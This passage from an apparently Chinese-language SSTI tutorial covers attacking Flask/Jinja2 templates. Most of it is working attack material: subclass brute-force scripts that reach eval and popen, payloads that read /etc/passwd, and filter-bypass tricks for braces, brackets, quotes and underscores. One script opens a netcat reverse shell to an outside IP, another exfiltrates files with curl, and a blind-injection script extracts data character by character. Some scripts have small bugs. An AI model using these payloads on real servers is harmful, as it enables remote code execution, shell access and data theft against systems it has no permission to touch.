response.status_code == 200:</span><br><span class="line">            if &#x27;eval&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p><strong>POST</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    data = &#123;&quot;x&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;eval&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p><strong>Payload：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /etc/passwd&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="os模块执行命令"><a href="#os模块执行命令" class="headerlink" title="os模块执行命令"></a>os模块执行命令</h3><p>在其他函数中直接调用os模块<br>通过<code>config</code>，调用os  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>url_for</code>，调用os</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>在已经加载os模块的子类里直接调用os模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;.__class__.__base__[0].__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&quot;Is -l /opt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>脚本查找已经加载os模块的子类：<br><strong>GET</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    param = &#123;&quot;x&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url, params=param)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;os.py&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p><strong>POST</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    data = &#123;&quot;x&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;os.py&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<h3 id="improtlib类执行命令"><a href="#improtlib类执行命令" class="headerlink" title="improtlib类执行命令"></a>improtlib类执行命令</h3><p>可以加载第三方库，使用load_module加载os<br>通过python脚本查找<code>_frozen_importlib.BuiltinImporter</code><br>然后加上<code>[&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l /opt&quot;).read()</code>  </p>
<h3 id="linecache函数执行命令"><a href="#linecache函数执行命令" class="headerlink" title="linecache函数执行命令"></a>linecache函数执行命令</h3><p>linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用这个linecache函数去执行命令。<br>和eval函数一样的脚本将eval替换掉即可，然后在后面加上<code>[&#39;linecache&#39;][&#39;os&#39;].popen(&quot;Is -l /&quot;).read()</code>  </p>
<h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a>subprocess.Popen</h3><p>从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。<br>subprocess意在替代其他几个老的模块或者函数，比如: os.system、os.popen等函数。<br>用python脚本查找subprocess.Popen类<br>然后在后面添加<code>(&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip()</code> </p>
<h2 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h2><p><code>&#123;% %&#125;</code>使用介绍：<br><code>&#123;% %&#125;</code>是属于flask的控制语句,且以<code>&#123;% end... %&#125;</code>结尾，可以通过在控制语句定义变量或者写循环，判断。<br><strong>示例：</strong><br>demo.py:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def show1():</span><br><span class="line">    girls = [&#x27;如花&#x27;,&#x27;李冰冰&#x27;,&#x27;杨幂&#x27;,&#x27;孙艺珍&#x27;,&#x27;郭德纲&#x27;]</span><br><span class="line">    return render_template(&#x27;index.html&#x27;,girls=girls)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>index.html:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charest=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;演示控制块&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for girl in girls %&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230927005355.png"><br><strong>判断语句</strong><br>可以在index.html页面中的title下面插入一段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">style&gt;</span><br><span class="line">            .a&#123;</span><br><span class="line">                color:red;</span><br><span class="line">                font-weight: bold;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>将控制块改为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for girl in girls %&#125;</span><br><span class="line">      &#123;% if girl|length &gt;=3 %&#125;</span><br><span class="line">        &lt;li class=&quot;a&quot;&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;li&gt;</span><br><span class="line">      &#123;% else %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230927010415.png"><br>当进行SSTI时，发现<code>&#123;&#123;&#125;&#125;</code>被过滤，尝试<code>&#123;% %&#125;</code>，判断语句能否正常执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 2&gt;1 %&#125;lhq&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>显示lhq说明正常执行  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__ %&#125;lhq&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>回显lhq说明<code>&#39;&#39;.__class__</code>有内容<br>那么可以构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if &#x27;&#x27;.__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;lhq&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>如果有回显lhq说明命令正常执行<br>编写脚本：<br><strong>POST</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&quot;code&quot;: &#x27;&#123;%if &#x27;&#x27;.__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;lhq&#123;% endif %&#125;&#x27;&#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;lhq&#x27; in response.text:</span><br><span class="line">                print(i,&quot;---&gt;&quot;,data)</span><br><span class="line">                break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p><strong>GET</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    try:</span><br><span class="line">        param = &#123;&quot;code&quot;: &#x27;&#123;%if &#x27;&#x27;.__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;lhq&#123;% endif %&#125;&#x27;&#125;</span><br><span class="line">        response = requests.get(url, params=param)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;lhq&#x27; in response.text:</span><br><span class="line">                print(i,&quot;---&gt;&quot;,data)</span><br><span class="line">                break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p>查找object下面的子类的某一个能直接调用globals下面的popen指令<br>得到结果后,<code>print()</code>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(&#x27;&#x27;.__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read()) %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h2><p><strong>SSTI盲注思路</strong>  </p>
<ol>
<li>反弹shell<br> 通过rce反弹一个shell出来绕过无回显的页面  </li>
<li>带外注入<br> 通过requestbin或dnslog的方式将信息传到外界  </li>
<li>纯盲注<br>总共只有两个页面，一个命令执行正确，一个命令执行错误的页面</li>
</ol>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>无回显，直接使用脚本批量执行希望执行的命令<br>先在kali上执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
<p>然后运行脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&quot;code&quot;: &#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 172.21.159.207 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;&#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p>查找包含popen的子类执行命令<br><code>for i in range</code>循环执行，当遇到包含popen的子类时，直接执行<code>netcat kaliIP 7777 -e /bin/bash</code>，监听主机收到反弹shell进入对方命令行界面  </p>
<h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><p>此处使用<code>wget</code>方法来带外想要知道的内容，也可以使用dnslog或者nc。<br>kali开一个python http监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<p> 运行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&quot;code&quot;: &#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl  http://172.21.155.46/`cat /etc/passwd`&quot;).read()&#125;&#125;&#x27;&#125;</span><br><span class="line">#反引号命令执行</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<h3 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">def check(payload):</span><br><span class="line">    postdata = &#123;</span><br><span class="line">        &#x27;code&#x27;:payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url,data=postdata)</span><br><span class="line">    if &#x27;lhq&#x27; in response.text:</span><br><span class="line">        return &#x27;1&#x27;</span><br><span class="line"> # check检查是否response回复有lhq</span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">s = r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span><br><span class="line">for i in range(100):</span><br><span class="line">    for c in s:</span><br><span class="line">        payload = &#x27;&#123;% if &quot;&quot;.__class__.base__[0].__subclasses__()[199].__init__.__globals__[&quot;os&quot;].popen(&quot;cat /etc/passwd&quot;).read()[&#x27;+str[i]+&#x27;:&#x27;+str[i+1]+&#x27;] == &quot;&#x27;+c+&#x27;&quot; %&#125;lhq&#123;% endif %&#125;&#x27;</span><br><span class="line">        #命令执行成功后对比c与s的值，==比对成功则回复lhq</span><br><span class="line">        if check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            break</span><br><span class="line">        # check检测成功则赋值给password</span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>
<h2 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h2><p><code>__getitem__()</code>魔术方法：<br>getitem()是python的一个魔法方法，对字典使用时，传入字符串，返回字典相应键所对应的值；当对列表使用时，传入整数返回列表对应索引的值。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class test():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.a=&#123;</span><br><span class="line">            &#x27;1&#x27;:&#x27;大壮&#x27;,</span><br><span class="line">            &#x27;2&#x27;:&#x27;老王&#x27;,</span><br><span class="line">            &#x27;3&#x27;:&#x27;老李&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    def __getitem__(self,key):</span><br><span class="line">        b = self.a[key]</span><br><span class="line">        return b</span><br><span class="line">t = test()</span><br><span class="line">print(t[&#x27;2&#x27;])</span><br><span class="line">//系统会自动调用__getitem__方法</span><br></pre></td></tr></table></figure>
<p>若中括号被过滤，则当payload执行到<code>&#123;&#123;''.__class__.__base__.__subclasses__()[]&#125;&#125;</code>时会遭遇WAF，但是由于我们的subclasses查询的结果是一个list，所以我们使用<code>__getitem__(117)</code>，来代替中括号的作用</p>
<h2 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h2><p>request在flask中可以访问基于HTTP请求传递的所有信息<br>此request并非python的函数，而是在flask内部的函数<br> demo.py:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template,request</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def show1():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>index.html:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charest=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;过滤器的使用&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">获取get提交数据：&#123;&#123;request.args.lhq&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">获取post提交数据：&#123;&#123;request.form.lhq&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230927155320.png"><br>在构造payload时大多会用到单双引号<br>先通过脚本查找request模块所在位置<br><code>&#39;os._wrap_close&#39;</code>内可以执行，因此查找该模块位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    data = &#123;&quot;code&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;_wrap_close&#x27; in response.text:</span><br><span class="line">                print(i,&quot;-----&gt;&quot;,response.text)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<p>如果被过滤，则可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.lhq](request.args.cmd).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>同时通过get提交参数<code>?lhq=popen&amp;cmd=cat flag</code><br>post同理，无非就是将参数一起提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.lhq](request.form.cmd).read()&#125;&#125;&amp;lhq=popen&amp;cmd=cat flag</span><br></pre></td></tr></table></figure>
<p>cookie方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookie.lhq](request.cookie.cmd).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>同时提交cookie：<code>lhq=popen;cmd=cat flag</code></p>
<h2 id="attr过滤器绕过下划线过滤"><a href="#attr过滤器绕过下划线过滤" class="headerlink" title="attr过滤器绕过下划线过滤"></a>attr过滤器绕过下划线过滤</h2><p>过滤器通过管道符号(|)与变量连接,并且在括号中可能有可选的参数。<br><strong>flask常用过滤器：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length():#获取一个序列或者字典的长度并将其返回;</span><br><span class="line">int():#将值转换为int类型;</span><br><span class="line">float():#将值转换为float类型;</span><br><span class="line">lower():#将字符串转换为小写;</span><br><span class="line">upper():#将字符串转换为大写;</span><br><span class="line">reverse():#反转字符串;</span><br><span class="line">replace(value,old,new):#将value中的old替换为new;</span><br><span class="line">list():#将变量转换为列表类型;</span><br><span class="line">string():#将变量转换成字符串类型;</span><br><span class="line">join():#将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用;</span><br><span class="line">attr():#获取对象的属性。</span><br></pre></td></tr></table></figure>

<p>app.py:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def show1():</span><br><span class="line">    girls = [&#x27;如花&#x27;,&#x27;李冰冰&#x27;,&#x27;杨幂&#x27;,&#x27;孙艺珍&#x27;,&#x27;郭德纲&#x27;]</span><br><span class="line">    users = [&#x27;lhq&#x27;,&#x27;LINGHUAQIAN&#x27;]</span><br><span class="line">    return render_template(&#x27;index.html&#x27;,girls=girls,users=users)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>index.html:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charest=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;过滤器的使用&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">当前用户总共：&#123;&#123; girls|length &#125;&#125;人</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;&#123; girls.append(&#x27;小美&#x27;) &#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">当前用户总共：&#123;&#123; girls|length &#125;&#125;人</span><br><span class="line">&lt;br&gt;</span><br><span class="line">大写转换：&#123;&#123; users|upper&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前用户总共：5人</span><br><span class="line">None</span><br><span class="line">当前用户总共：6人</span><br><span class="line">大写转换：[&#x27;LHQ&#x27;, &#x27;LINGHUAQIAN&#x27;]</span><br></pre></td></tr></table></figure>
<p>想要绕过下划线过滤，此处需要用到<code>attr():#获取对象的属性。</code>  </p>
<ol>
